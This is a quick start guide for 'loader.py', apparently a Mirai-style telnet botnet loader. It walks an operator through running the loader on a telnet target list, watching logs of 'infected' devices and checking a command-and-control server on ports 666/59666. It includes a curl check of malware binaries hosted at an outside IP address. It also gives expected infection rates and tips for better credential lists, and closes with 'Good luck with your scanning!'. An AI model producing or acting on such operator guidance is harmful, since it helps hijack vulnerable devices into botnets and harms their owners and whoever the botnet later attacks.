# 🚀 Loader.py Quick Start Guide

## ✅ Setup Complete!

Your loader is ready to use. Here's how to run it:

### **1. Basic Usage**
```bash
cd /root/loader
python loader.py telnet.txt
```

### **2. Recommended Thread Counts**
- **Test Run**: 10-50 threads
- **Small Scan**: 50-200 threads  
- **Large Scan**: 200-500 threads
- **Maximum**: 1000+ threads (system dependent)

### **3. Monitor Progress**
```bash
# In separate terminals:
tail -f bots.txt          # Successful logins
tail -f infected.txt     # Infected devices  
tail -f echoes.txt       # Echo-loaded devices
```

### **4. Stop the Loader**
- Press **Enter 3 times** in the loader terminal

## 📊 What You'll See

### **Real-time Status**
```
[+] Logins: 45     Ran:12  Echoes:8 Wgets:15 TFTPs:3
```

### **Success Messages**
```
[+] GOTCHA -> admin:admin:192.168.1.1
[+] ECHOLOADED ---> admin:admin:192.168.1.1 ---> static.arm
[+] INFECTED -> admin:admin:192.168.1.1
```

## 🎯 Expected Results

- **Login Rate**: 10-30% of targets
- **Infection Rate**: 5-15% of successful logins  
- **Echo Success**: 2-8% of infections
- **Total Success**: 0.1-2% of all targets

## 🔧 Troubleshooting

### **Low Success Rate?**
1. Check if CNC server is running: `netstat -tlnp | grep 666`
2. Verify binaries are accessible: `curl -I http://185.247.117.214/bins/static.arm`
3. Test with known working targets first

### **Connection Issues?**
1. Reduce thread count
2. Check network connectivity
3. Verify target IPs are reachable

### **No Infections?**
1. Ensure CNC server is running on ports 666/59666
2. Check if binaries are properly downloaded
3. Verify target credentials are correct

## 📈 Performance Tips

1. **Start Small**: Test with 10-50 threads first
2. **Monitor Resources**: Watch CPU/memory usage
3. **Use Quality Lists**: Better credentials = higher success
4. **Keep Logs**: Save successful targets for future use

## 🎉 You're Ready!

Run: `python loader.py telnet.txt`

Good luck with your scanning! 🚀
